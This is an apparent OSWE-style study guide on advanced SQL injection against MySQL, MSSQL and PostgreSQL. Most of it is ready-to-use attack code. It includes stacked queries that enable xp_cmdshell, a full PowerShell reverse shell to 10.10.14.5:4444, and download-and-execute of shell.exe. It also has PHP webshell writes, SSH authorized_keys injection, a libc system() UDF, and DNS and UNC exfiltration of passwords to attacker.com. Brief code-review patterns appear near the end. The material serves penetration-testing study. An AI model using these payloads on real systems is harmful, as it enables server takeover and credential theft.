# Advanced SQL Injection Techniques Guide

## Overview
Advanced SQLi goes beyond basic data extraction to achieve Remote Code Execution, second-order injection, and sophisticated data exfiltration. This guide focuses on OSWE-level techniques for escalating SQLi to full system compromise.

## Part 1: Second-Order SQL Injection

### What is Second-Order SQLi?

Unlike first-order SQLi where the payload executes immediately, second-order SQLi involves:
1. **Storage Phase**: Malicious input stored in database
2. **Execution Phase**: Stored data used in a different query (often with higher privileges)

### Identification Methodology

**Step 1: Identify Storage Points**
```bash
# Look for insert/update operations
grep -r "INSERT INTO\|UPDATE.*SET" .
grep -r "prepared.*execute\|bind_param" .
```

**Step 2: Identify Trigger Points**
```bash
# Common trigger locations:
- Admin panels (user search, reports)
- Export functions (CSV, PDF generation)
- Email notifications (templates)
- Audit logs (activity displays)
```

### Exploitation Pattern

**Example Vulnerable Code**:
```php
// Registration: Input stored with prepared statement (SAFE)
$stmt = $db->prepare("INSERT INTO users (username, email, bio) VALUES (?, ?, ?)");
$stmt->execute([$username, $email, $bio]);

// Admin search: Stored data used unsafely (VULNERABLE)
$search = $_GET['search'];
$query = "SELECT * FROM users WHERE username = '$search'"; // VULNERABLE
$result = $db->query($query);
```

**Exploit Chain**:
```
1. Register with payload in bio: admin' AND SLEEP(5)-- -
2. Payload stored safely in database
3. Admin searches for user by username
4. Query becomes: SELECT * FROM users WHERE bio LIKE '%admin' AND SLEEP(5)-- -%'
5. Time delay confirms SQLi
6. Escalate to data extraction or RCE
```

### Detection Payloads

**Time-Based Detection**:
```sql
-- MySQL
admin' AND SLEEP(5)-- -

-- MSSQL
admin'; WAITFOR DELAY '00:00:05'-- -

-- PostgreSQL
admin'; SELECT pg_sleep(5)-- -

-- Oracle
admin' AND DBMS_LOCK.SLEEP(5)-- -
```

**Boolean-Based Detection**:
```sql
admin' AND '1'='1
admin' AND '1'='2
```

### Common Second-Order Contexts

| Storage Point | Trigger Point | Example |
|--------------|---------------|---------|
| User registration (bio) | Admin user search | Search users by bio field |
| Profile update (lastname) | Report generation | Generate user report PDF |
| Comment submission | Admin moderation | Display comment in admin panel |
| Feedback form | Email notification | Email template rendering |
| File upload (filename) | File listing | Directory browser display |

## Part 2: MSSQL xp_cmdshell Exploitation

### Architecture Overview

**xp_cmdshell**: MSSQL stored procedure that executes OS commands
- Disabled by default in modern versions
- Requires `sysadmin` or `CONTROL SERVER` permissions to enable
- Returns command output as table rows

### Privilege Verification

```sql
-- Check current user
SELECT SYSTEM_USER;
SELECT USER_NAME();

-- Check role membership
SELECT IS_SRVROLEMEMBER('sysadmin');
-- Returns 1 if sysadmin, 0 otherwise

-- List all permissions
SELECT * FROM fn_my_permissions(NULL, 'SERVER');
```

### Enabling xp_cmdshell

**Method 1: sp_configure**:
```sql
-- Enable advanced options
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;

-- Enable xp_cmdshell
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
```

**Method 2: Stacked Queries via SQLi**:
```sql
'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;-- -
```

**Method 3: Policy-Based Management (if sp_configure blocked)**:
```sql
'; EXEC sp_configure 'show advanced options', 1; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE WITH OVERRIDE;-- -
```

### Command Execution

**Basic Execution**:
```sql
-- Single command
EXEC xp_cmdshell 'whoami';

-- Via SQLi
'; EXEC xp_cmdshell 'whoami';-- -

-- Output capture
'; CREATE TABLE cmd_output (output VARCHAR(8000)); INSERT INTO cmd_output EXEC xp_cmdshell 'whoami'; SELECT * FROM cmd_output;-- -
```

**PowerShell Download & Execute**:
```sql
-- Download file
'; EXEC xp_cmdshell 'powershell -c "Invoke-WebRequest -Uri http://10.10.14.5/shell.exe -OutFile C:\Temp\shell.exe"';-- -

-- Execute
'; EXEC xp_cmdshell 'C:\Temp\shell.exe';-- -

-- One-liner reverse shell
'; EXEC xp_cmdshell 'powershell -c "$client = New-Object System.Net.Sockets.TCPClient(''10.10.14.5'',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + ''PS '' + (pwd).Path + ''> '';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"';-- -
```

### Output Extraction (Blind SQLi)

**Time-Based Extraction**:
```sql
-- Extract first character of hostname
'; DECLARE @output VARCHAR(8000); EXEC xp_cmdshell 'hostname', @output OUTPUT; IF SUBSTRING(@output,1,1)='W' WAITFOR DELAY '00:00:05';-- -
```

**Error-Based Extraction**:
```sql
-- Force error with command output
'; DECLARE @output VARCHAR(8000); EXEC xp_cmdshell 'whoami', @output OUTPUT; EXEC('SELECT ' + @output);-- -
```

**DNS Exfiltration**:
```sql
-- Use nslookup to exfiltrate data
'; DECLARE @output VARCHAR(8000); EXEC xp_cmdshell 'whoami', @output OUTPUT; EXEC xp_cmdshell 'nslookup ' + @output + '.attacker.com';-- -
```

### Alternative RCE Methods (if xp_cmdshell blocked)

**OLE Automation**:
```sql
-- Enable OLE Automation
EXEC sp_configure 'Ole Automation Procedures', 1;
RECONFIGURE;

-- Execute command via WScript.Shell
DECLARE @output INT;
EXEC sp_OACreate 'wscript.shell', @output OUT;
EXEC sp_OAMethod @output, 'run', NULL, 'cmd.exe /c whoami > C:\output.txt';
```

**OPENROWSET for File Write**:
```sql
-- Write webshell
'; SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE 'C:\inetpub\wwwroot\shell.php';-- -
```

## Part 3: MySQL File Read/Write

### FILE Privilege Check

```sql
-- Check if current user has FILE privilege
SELECT user, file_priv FROM mysql.user WHERE user='current_user';

-- Alternative
SHOW GRANTS FOR CURRENT_USER();
```

### File Read (LOAD_FILE)

**Basic Usage**:
```sql
-- Read /etc/passwd
SELECT LOAD_FILE('/etc/passwd');

-- Via SQLi
' UNION SELECT LOAD_FILE('/etc/passwd')-- -

-- Windows paths
' UNION SELECT LOAD_FILE('C:\\Windows\\win.ini')-- -
```

**Common Target Files**:
```sql
-- Linux
/etc/passwd
/etc/shadow (if MySQL runs as root)
/var/www/html/config.php
/home/user/.ssh/id_rsa
/var/log/apache2/access.log

-- Windows
C:\Windows\win.ini
C:\inetpub\wwwroot\web.config
C:\xampp\htdocs\config.php
```

**Hex Encoding for Binary Files**:
```sql
-- Read binary file as hex
' UNION SELECT HEX(LOAD_FILE('/etc/passwd'))-- -
```

### File Write (INTO OUTFILE)

**Basic Usage**:
```sql
-- Write webshell
SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php';

-- Via SQLi
' UNION SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php'-- -
```

**Multi-Line Webshell**:
```sql
' UNION SELECT '<?php\nif(isset($_GET["cmd"])){\n  system($_GET["cmd"]);\n}\n?>' INTO OUTFILE '/var/www/html/shell.php'-- -
```

**SSH Key Write**:
```sql
-- Write SSH public key
' UNION SELECT 'ssh-rsa AAAAB3NzaC1...' INTO OUTFILE '/root/.ssh/authorized_keys'-- -
```

**Restrictions**:
- Target directory must be writable by MySQL user
- File must not already exist
- `secure_file_priv` must allow the path

### Bypassing secure_file_priv

**Check current setting**:
```sql
SHOW VARIABLES LIKE 'secure_file_priv';
```

**Alternatives if restricted**:
- Use MySQL log files: `SET GLOBAL general_log_file='/var/www/html/shell.php'; SET GLOBAL general_log='ON'; SELECT '<?php system($_GET["cmd"]); ?>';`
- Exploit symlinks (if MySQL follows them)
- Target allowed directories from `secure_file_priv`

## Part 4: PostgreSQL RCE

### COPY Command Exploitation

**File Read**:
```sql
-- Read file (requires superuser)
CREATE TABLE file_read(content TEXT);
COPY file_read FROM '/etc/passwd';
SELECT * FROM file_read;

-- Via SQLi
'; CREATE TABLE file_read(content TEXT); COPY file_read FROM '/etc/passwd'; SELECT * FROM file_read;-- -
```

**File Write**:
```sql
-- Write webshell
COPY (SELECT '<?php system($_GET["cmd"]); ?>') TO '/var/www/html/shell.php';

-- Via SQLi
'; COPY (SELECT '<?php system($_GET["cmd"]); ?>') TO '/var/www/html/shell.php';-- -
```

### Large Object (lo_*) Functions

**File Read via Large Objects**:
```sql
-- Create large object from file
SELECT lo_import('/etc/passwd', 12345);

-- Read large object
SELECT encode(lo_get(12345), 'escape');

-- Cleanup
SELECT lo_unlink(12345);
```

**File Write**:
```sql
-- Create large object with content
SELECT lo_from_bytea(0, '<?php system($_GET["cmd"]); ?>');

-- Export to file
SELECT lo_export(12345, '/var/www/html/shell.php');
```

### User-Defined Functions (UDF)

**Create Malicious UDF**:
```sql
-- Create function from shared library
CREATE OR REPLACE FUNCTION system(cstring) RETURNS int AS '/lib/x86_64-linux-gnu/libc.so.6', 'system' LANGUAGE 'c' STRICT;

-- Execute command
SELECT system('whoami');
```

## Part 5: Out-of-Band Data Exfiltration

### DNS Exfiltration

**MySQL**:
```sql
-- Windows (via nslookup)
SELECT LOAD_FILE(CONCAT('\\\\', (SELECT password FROM users LIMIT 1), '.attacker.com\\share'));

-- Linux (requires DNS to be working)
SELECT LOAD_FILE(CONCAT('//', (SELECT password FROM users LIMIT 1), '.attacker.com/'));
```

**MSSQL**:
```sql
-- Via xp_cmdshell
DECLARE @data VARCHAR(MAX);
SELECT @data = password FROM users;
EXEC xp_cmdshell 'nslookup ' + @data + '.attacker.com';
```

**PostgreSQL**:
```sql
-- Via COPY to network location
COPY (SELECT password FROM users) TO PROGRAM 'host attacker.com';
```

### HTTP Exfiltration

**MySQL (via LOAD_FILE UNC)**:
```sql
-- Windows only
SELECT LOAD_FILE(CONCAT('\\\\attacker.com\\', (SELECT password FROM users LIMIT 1)));
```

**MSSQL (via OPENROWSET)**:
```sql
SELECT * FROM OPENROWSET('MSDASQL', 'DRIVER={SQL Server};SERVER=attacker.com;UID=sa;PWD=pass', 'SELECT password FROM users');
```

## Part 6: Binary Search Optimization

### Concept

Instead of extracting data character-by-character (26+ requests per char), use binary search (log2(N) requests).

### Implementation

**Traditional Method** (slow):
```python
for char in string.printable:
    payload = f"' AND SUBSTRING(password,1,1)='{char}'-- -"
    # 94 possible printable chars = 94 requests per position
```

**Binary Search Method** (fast):
```python
def binary_search_char(position):
    low, high = 32, 126  # ASCII printable range
    while low <= high:
        mid = (low + high) // 2
        payload = f"' AND ASCII(SUBSTRING(password,{position},1))>{mid}-- -"
        if send_payload(payload):
            low = mid + 1
        else:
            high = mid - 1
    return chr(low)
# Only log2(94) ≈ 7 requests per position
```

### Time-Based Binary Search

```python
def time_based_binary_search(position):
    low, high = 32, 126
    while low <= high:
        mid = (low + high) // 2
        payload = f"' AND IF(ASCII(SUBSTRING(password,{position},1))>{mid}, SLEEP(5), 0)-- -"
        start = time.time()
        send_payload(payload)
        elapsed = time.time() - start
        if elapsed >= 5:
            low = mid + 1
        else:
            high = mid - 1
    return chr(low)
```

## Part 7: OSWE Exam Strategy

### Second-Order SQLi Workflow (25 minutes)

**1. Identify Storage Points** (5 min):
- Registration forms
- Profile updates
- Comment submissions
- File uploads

**2. Identify Trigger Points** (5 min):
- Admin panels
- Search functions
- Report generation
- Export features

**3. Test with Time-Based Payloads** (5 min):
```sql
admin' AND SLEEP(5)-- -
```

**4. Escalate to Data Extraction** (10 min):
- If time-based works, use binary search
- Check for UNION-based in trigger context
- Attempt file write if FILE privileges exist

### MSSQL xp_cmdshell Workflow (20 minutes)

**1. Verify SQLi** (3 min):
```sql
'; WAITFOR DELAY '00:00:05'-- -
```

**2. Check Privileges** (2 min):
```sql
'; IF (SELECT IS_SRVROLEMEMBER('sysadmin'))=1 WAITFOR DELAY '00:00:05'-- -
```

**3. Enable xp_cmdshell** (5 min):
```sql
'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;-- -
```

**4. Execute Commands** (10 min):
```sql
-- Ping test
'; EXEC xp_cmdshell 'ping -n 4 10.10.14.5';-- -

-- PowerShell reverse shell
'; EXEC xp_cmdshell 'powershell -c "$client = New-Object System.Net.Sockets.TCPClient(''10.10.14.5'',4444); ..."';-- -
```

### MySQL File Write Workflow (15 minutes)

**1. Verify SQLi and UNION** (3 min):
```sql
' UNION SELECT 1,2,3-- -
```

**2. Check FILE Privilege** (2 min):
```sql
' UNION SELECT file_priv FROM mysql.user WHERE user=SUBSTRING_INDEX(USER(),'@',1)-- -
```

**3. Find Web Root** (5 min):
```sql
' UNION SELECT @@datadir-- -  # MySQL data directory
' UNION SELECT LOAD_FILE('/etc/apache2/sites-enabled/000-default.conf')-- -  # Apache config
```

**4. Write Webshell** (5 min):
```sql
' UNION SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php'-- -
```

### Time Management Tips

- **Second-Order SQLi**: Spend most time identifying trigger points (admin panels are gold)
- **MSSQL**: Don't waste time on data extraction - go straight for xp_cmdshell
- **MySQL**: File write is fastest path to RCE
- **Binary Search**: Only use if required for exam objective (data extraction)

## Part 8: Code Review Patterns

### Second-Order SQLi Indicators

```bash
# Find storage (usually SAFE)
grep -r "prepare\|bind_param\|execute" .

# Find trigger points (VULNERABLE)
grep -r "query\|mysqli_query\|exec" .
grep -r "\\$.*SELECT.*WHERE" .  # String interpolation in queries
```

**Vulnerable Pattern**:
```php
// Storage: SAFE (prepared statement)
$stmt = $db->prepare("INSERT INTO users (username) VALUES (?)");
$stmt->execute([$username]);

// Trigger: VULNERABLE (stored data used unsafely)
$user = $_GET['user'];
$query = "SELECT * FROM logs WHERE username = '" . $user . "'";
```

### MSSQL RCE Indicators

```bash
# Find MSSQL connections
grep -r "SqlConnection\|System.Data.SqlClient" .
grep -r "sql_query\|mssql_query" .

# Check for stacked query support
grep -r "CommandType.Text\|CommandType.StoredProcedure" .
```

### Quick Wins Checklist

- [ ] Search for `$_GET`/`$_POST` used directly in queries
- [ ] Check if database user is `root`/`sa`/`postgres`
- [ ] Look for admin panels with search/export functions
- [ ] Find file upload forms (second-order via filename)
- [ ] Check for UNION-based first (faster than blind)

## References
- OWASP SQLi: https://owasp.org/www-community/attacks/SQL_Injection
- PortSwigger Second-Order: https://portswigger.net/kb/issues/00100210_sql-injection-second-order
- MySQL Documentation: https://dev.mysql.com/doc/
- MSSQL xp_cmdshell: https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql
- PayloadsAllTheThings: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection
